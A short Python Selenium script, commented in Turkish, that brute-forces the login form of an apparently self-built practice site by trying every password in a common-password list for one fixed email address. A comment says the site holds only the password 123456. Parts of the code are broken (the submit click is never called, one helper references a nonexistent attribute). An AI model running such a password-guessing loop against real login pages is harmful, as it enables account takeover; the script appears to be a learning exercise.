

#Gerekli kütüphanelerin dahil edilmesi
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import http



# sol tarafta çıkan şifre yanlış uyarısının olup olmadığını kontrol eden method. 
def check_exists_by_xpath(xpath):
    try:
        driver.find_element(by=By.XPATH,value=xpath)
    except NoSuchElementException:
        return False
    return True
# şifrenin yanlış olduğunu alternatfi olarak linki kontrol ederek yapabiliriz. 

def check_link(link):
    if http.url == 'https://bruteforce-8is0.onrender.com/verification':
        return True
    else:
        False
    

#chrome ile alakalı opsiyonların belirlendiği kısım. 
chrome_options = Options()
chrome_options.add_experimental_option("detach", True)

#chrome web sürücüsünün oluşturulması. Bu "driver" ile birlikte chrome üzerindeki her türlü sayfa ile etkileşim kurulabilir. 

driver = webdriver.Chrome(options=chrome_options)
#sayfa büyütülüyor. 
driver.maximize_window()
#siteye gidiliyor
driver.get("https://bruteforce-8is0.onrender.com/")

#Şifre deneme ile alakalı method oluşturulması Girilen şifre login sayfasında denenecek. 
def loginUser(password):
    #eposta girilmesi
    eposta = driver.find_element(by=By.XPATH,value="//*[@id=':r0:']")
    eposta.clear()
    print("username: s_05_60@hotmail.com")
    eposta.send_keys("s_05_60@hotmail.com")
    #şifre girilmesi
    sifre = driver.find_element(By.XPATH,"//*[@id=':r1:']")
    sifre.clear()
    print("Sifre: "+password)
    sifre.send_keys(password)
    #girişte tıklanması
    buton = driver.find_element(By.XPATH,"//*[@id='root']/main/div/form/div/button")
    buton.click
    #4 saniye cevap için beklenmesi
    time.sleep(4)
    
    # uyarı mesajının çıkıp çıkmadığının kontrölü
    if(check_exists_by_xpath("//*[@id='root']/main/div/div/div/div[2]")):
        driver.refresh()
        return 0
    else:
        driver.close()
        return 1
    
#comman password_txt dosyasındaki tüm şifreler deneniyor. Siteye sadece 123456 şifresi kayıtlı. 
dosya = open("common_passwords.txt","r")
sifreler_liste = dosya.readlines()
for sifrem in sifreler_liste:
    kontrol = loginUser(sifrem)
    if kontrol==True:
        break





    



    


